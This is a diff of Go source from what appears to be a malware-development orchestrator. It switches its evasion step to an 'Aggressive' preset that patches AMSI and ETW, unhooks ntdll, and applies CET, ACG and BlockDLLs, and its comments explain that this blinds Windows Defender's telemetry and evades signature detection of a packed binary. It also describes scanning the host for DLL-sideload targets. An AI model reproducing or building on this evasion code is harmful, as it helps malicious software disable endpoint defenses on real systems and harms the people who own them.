@@ -93,21 +93,25 @@ func main() {
 	logStep("running as: %s", currentUser())
 	logStep("probe payload: %d bytes", len(probeBytes))
 	_ = os.WriteFile(`C:\ProgramData\maldev-marker\orch-step2-pre-evasion.txt`,
-		[]byte("flags parsed, about to call preset.Stealth\n"), 0o644)
+		[]byte("flags parsed, about to call preset.Aggressive\n"), 0o644)
 
-	// Defence in depth: apply evasion/preset.Stealth() which bundles
-	// AMSI patch + ETW patch + selective ntdll unhook. ETW is the
-	// important one for SYSTEM-context scenarios -- Defender's
-	// behavioural analysis subscribes to Microsoft-Windows-Threat-
-	// Intelligence ETW events; blinding that channel removes the
-	// telemetry that previously RC=1'd us silently AS lowuser.
+	// Defence in depth: apply evasion/preset.Aggressive() — Stealth
+	// (AMSI + ETW + ntdll unhook) + CET opt-out + ACG + BlockDLLs
+	// MicrosoftOnly. ETW is the important one for SYSTEM-context
+	// scenarios — Defender's behavioural analysis subscribes to the
+	// Microsoft-Windows-Threat-Intelligence ETW events; blinding
+	// that channel removes the telemetry that RC=1'd us silently
+	// AS lowuser. Aggressive's ACG + BlockDLLs raises the bar a
+	// second time against signature-based detection of our packed
+	// binary. Order-of-ops audit lives in amsi_windows.go's
+	// patchAMSI doc comment (slice 9.8.b).
 	if err := patchAMSI(); err != nil {
-		logStep("evasion.preset.Stealth failed (continuing): %v", err)
+		logStep("evasion.preset.Aggressive failed (continuing): %v", err)
 	} else {
-		logStep("evasion.preset.Stealth applied: AMSI + ETW + ntdll unhook")
+		logStep("evasion.preset.Aggressive applied: AMSI + ETW + unhook + CET + ACG + BlockDLLs")
 	}
 	_ = os.WriteFile(`C:\ProgramData\maldev-marker\orch-step3-post-evasion.txt`,
-		[]byte("preset.Stealth returned, continuing\n"), 0o644)
+		[]byte("preset.Aggressive returned, continuing\n"), 0o644)
 
 	// Live discovery via recon/dllhijack — eat our own dog food.
 	// Orchestrator scans the box for sideload-vulnerable processes,
